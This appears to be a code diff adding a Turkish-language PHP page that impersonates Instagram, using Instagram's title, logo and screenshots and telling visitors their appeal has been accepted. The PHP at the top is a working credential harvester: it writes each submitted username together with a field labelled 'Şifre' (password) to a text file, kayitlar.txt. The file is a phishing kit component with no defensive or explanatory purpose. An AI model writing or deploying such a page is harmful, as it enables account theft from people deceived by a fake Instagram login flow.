@@ -1,0 +1,42 @@
+<?php
+// Veriyi kaydet
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = trim($_POST['username'] ?? '');
+    $info = trim($_POST['info'] ?? '');
+
+    if ($username !== '' && $info !== '') {
+        $file = fopen('kayitlar.txt', 'a');
+        if ($file) {
+            $time = date('Y-m-d H:i:s');
+            fwrite($file, "[$time] Kullanıcı: $username - Şifre: $info\n");
+            fclose($file);
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <main class="container" role="main">
+    <section class="phone" aria-label="Instagram uygulama ekran görüntüsü">
+      <img src="https://instagram-static.s3.amazonaws.com/homepage/screenshots/screenshot1.png" alt="Instagram mobil uygulama ekran görüntüsü" />
+    </section>
+    <section class="login-box" aria-label="Instagram onay mesajı">
+      <a href="https://www.instagram.com" target="_blank" rel="noopener noreferrer" class="logo" aria-label="Instagram ana sayfa">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" />
+      </a>
+
+      <p style="font-weight: 600; font-size: 18px; color: #262626; margin-top: 40px;">
+        İtirazınız kabul edildi.
+      </p>
+    </section>
+  </main>
+</body>
+</html>
